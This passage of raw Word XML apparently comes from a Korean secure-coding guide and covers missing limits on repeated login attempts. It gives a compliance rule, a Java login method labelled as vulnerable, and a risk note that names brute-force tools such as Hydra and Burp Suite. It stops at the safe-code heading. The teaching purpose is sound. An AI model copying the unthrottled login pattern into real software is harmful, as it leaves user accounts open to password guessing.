        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>반복된</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인증시도</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기능</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>부재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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인증시도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횟수를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적절히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제한하고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초과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시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계정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잠금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또는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추가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인증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절차를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적용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>횟수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없음</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>public boolean login(String id, String pw) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return userDao.checkPassword(id, pw);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반복</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> → </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>브루트포스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>횟수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제한이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동화</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>툴</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">(Hydra, Burp Suite </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>초당</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수백</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>~</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수천</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대입할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>. 8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숫자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>분</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영숫자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>혼합도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>무차별</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대입으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
